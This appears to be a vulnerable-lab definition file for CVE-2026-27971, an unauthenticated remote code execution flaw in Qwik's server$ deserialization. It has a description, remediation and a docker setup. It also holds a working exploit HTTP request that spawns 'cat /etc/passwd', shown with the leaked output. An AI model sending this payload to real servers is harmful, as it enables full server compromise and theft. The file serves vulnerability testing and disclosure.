id: vt-2026-27971

info:
  name: "Qwik - Unauthenticated RCE via server$ Deserialization"
  author: omarkurt
  description: |
    Qwik framework versions 1.19.0 and prior contain an unsafe deserialization
    vulnerability in the server$ RPC mechanism. The importSymbol function in the
    server platform falls back to using require() with a user-controlled URL path
    when a QRL symbol is not found in the pre-registered symbols map. This allows
    any unauthenticated attacker to execute arbitrary code on the server with a
    single HTTP request. Affects any deployment where require() is available at
    runtime (standard Node.js).
  type: CVE
  targets:
    - qwik
  cve: CVE-2026-27971
  cwe: CWE-502
  cvss:
    score: 9.2
    severity: critical
    metrics: "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
  affected_versions:
    - "<= 1.19.0"
  fixed_version: "1.19.1"
  tags:
    - rce
    - deserialization
    - qwik
    - cve-2026
    - unauthenticated
    - nodejs
  references:
    - https://github.com/QwikDev/qwik/security/advisories/GHSA-p9x5-jp3h-96mm
    - https://nvd.nist.gov/vuln/detail/CVE-2026-27971
    - https://vulnerabletarget.com/VT-2026-27971

vulnerabilities:
  - id: server_rce
    name: "RCE via server$ QRL Deserialization"
    description: |
      The server$ RPC endpoint deserializes QRL objects from application/qwik-json
      POST requests. The importSymbol function uses require() with attacker-controlled
      module paths, allowing arbitrary module loading and code execution.
    endpoint: /
    method: POST
    param: qfunc
    request: |
      POST /?qfunc=sync HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/qwik-json
      X-QRL: sync
      Origin: http://{{Hostname}}

      {"_objs":["\u0002./node_modules/cross-spawn/index#sync","cat","/etc/passwd",["2"],["0","1","3"]],"_entry":"4"}
    response: |
      HTTP/1.1 200 OK
      Content-Type: application/qwik-json

      {"result":"root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin:\n"}

technical: |
  The vulnerability exists in packages/qwik/src/server/platform.ts in the
  importSymbol function. When a QRL references a symbol not found in the
  pre-registered symbols map (__qwik_reg_symbols), the code falls back to
  require() with the attacker-controlled URL from the QRL. The server$
  RPC mechanism deserializes QRL objects from POST requests with
  Content-Type: application/qwik-json, allowing an attacker to craft a
  QRL pointing to any Node.js module (e.g., child_process) and invoke
  any exported function (e.g., execSync) with arbitrary arguments.
  The fix in 1.19.1 removes the require() fallback and throws an error
  instead when a symbol is not pre-registered.

impact: |
  An unauthenticated attacker can achieve Remote Code Execution on any
  Qwik application running on Node.js. This allows full server compromise
  including data theft, lateral movement, and service disruption.

remediation:
  - "Upgrade @builder.io/qwik to version 1.19.1 or later"
  - "Deploy on edge runtimes without require() (Cloudflare Workers, Deno) as mitigation"

poc:
  nuclei:
    - "vt-2026-27971.nuclei.yaml"

providers:
  docker-compose:
    path: "docker-compose.yaml"

post-install:
  - "Access the application at http://localhost:3000"
  - "The Qwik app runs in SSR dev mode with server$ RPC enabled"
